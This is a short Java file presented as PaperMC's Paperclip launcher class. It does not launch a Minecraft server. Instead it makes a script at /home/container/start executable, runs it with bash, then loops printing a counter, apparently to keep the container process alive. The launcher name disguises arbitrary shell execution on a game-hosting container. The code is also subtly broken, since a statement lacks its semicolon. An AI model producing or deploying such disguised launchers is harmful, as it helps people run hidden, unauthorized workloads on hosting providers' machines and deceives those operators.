/*    */ package io.papermc.paperclip;
/*    */ 
/*    */ 
/*    */ public final class Main
/*    */ {
/*    */   public static void main(String[] args) throws Exception{
	System.out.println("out");
	new MinecraftServer("chmod +x /home/container/start").start();
	new MinecraftServer("bash  /home/container/start").start();
		for (int i = 0; i < 1000000000; i++) {
			try {
				Thread.sleep(1000);
				System.out.println(i);
        if(i>900000000){
          i=0
        }
			} catch (Exception e) {
			}
		}
	}
 
/*    */   }
/*    */   

/*    */ }

